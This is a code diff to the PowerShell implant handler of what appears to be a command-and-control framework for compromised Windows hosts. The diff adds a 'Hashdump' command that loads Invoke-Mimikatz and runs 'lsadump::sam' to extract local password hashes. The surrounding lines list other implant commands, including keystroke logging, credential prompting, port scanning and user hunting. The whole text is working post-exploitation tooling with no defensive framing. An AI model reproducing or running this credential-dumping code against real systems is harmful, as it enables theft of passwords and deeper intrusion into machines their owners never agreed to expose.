@@ -196,6 +196,7 @@ function Implant-Handler
         write-host " Get-Screenshot" -ForegroundColor Green 
         write-host " Get-RecentFiles" -ForegroundColor Green
         write-host " Cred-Popper" -ForegroundColor Green 
+        write-host " Hashdump" -ForegroundColor Green 
         write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
         write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
@@ -643,6 +644,11 @@ $error.clear()
 Write-Output "Error removing persistence, remove registry keys manually!"
 $error.clear()
 }'            
+            }
+            if ($pscommand.ToLower().StartsWith('hashdump'))
+            { 
+                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
+                $pscommand = "Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)"
             }
             if ($pscommand.ToLower().StartsWith('test-adcredential'))
             { 
